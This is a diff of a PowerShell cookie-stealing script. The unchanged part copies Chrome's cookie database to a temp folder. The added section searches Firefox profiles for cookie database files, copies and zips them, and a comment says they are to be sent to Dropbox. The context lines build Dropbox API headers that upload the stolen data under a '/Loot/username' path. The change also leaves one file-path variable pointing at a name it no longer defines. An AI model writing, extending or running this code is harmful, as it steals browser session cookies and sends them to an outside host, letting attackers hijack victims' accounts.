@@ -1,14 +1,55 @@
-$cookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-$filePath = "$env:temp\Cookies"
-$destinationPath = "/Loot/$env:USERNAME/Cookies"
+$GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+$GfilePath = "$env:temp\Cookies"
+$GdestinationPath = "/Loot/$env:USERNAME/Cookies"
 
-Copy-Item -Path $cookiesPath -Destination $filePath -Force
+------------------------------------------------------------------------------------------------------------------------------------------
+
+Copy-Item -Path $GcookiesPath -Destination $GfilePath -Force
+
+------------------------------------------------------------------------------------------------------------------------------------------
+#
+# This section will search for firefox cookies and place them in a folder in the tmp directory then zip the file to be sent to dropbox
+#
+
+$SearchPath = "C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles"
+$FilesToSearch = @("cookies.sqlite", "cookies.sqlite-shm", "cookies.sqlite-wal")
+$TempFolderPath = "$env:tmp\Firefox-Cookies\"
+
+mkdir $env:tmp\Firefox-Cookies
+
+$Results = @()
+
+$FilesToSearch | ForEach-Object {
+    $SearchPattern = $_
+    $Files = Get-ChildItem -Path $SearchPath -Recurse -Filter $SearchPattern -ErrorAction SilentlyContinue
+    if ($Files) {
+        $Results += $Files
+    }
+}
+
+if ($Results) {
+    Write-Host "Found the following files:"
+    $Results | Select-Object FullName
+
+    $Results | ForEach-Object {
+        $DestinationPath = Join-Path -Path $TempFolderPath -ChildPath $_.Name
+        Copy-Item -Path $_.FullName -Destination $DestinationPath -Force
+    }
+
+    Write-Host "Files copied to $TempFolderPath"
+} else {
+    Write-Host "No files found."
+}
+
+Compress-Archive -Path "$env:tmp\Firefox-Cookies" -DestinationPath "$env:tmp\Firefox-Cookies.zip"
+
+------------------------------------------------------------------------------------------------------------------------------------------
 
 try {
     $headers = @{
         "Authorization" = "Bearer $db"
         "Content-Type" = "application/octet-stream"
-        "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
+        "Dropbox-API-Arg" = '{"path": "' + $GdestinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     }
 
     $fileContent = [System.IO.File]::ReadAllBytes($filePath)
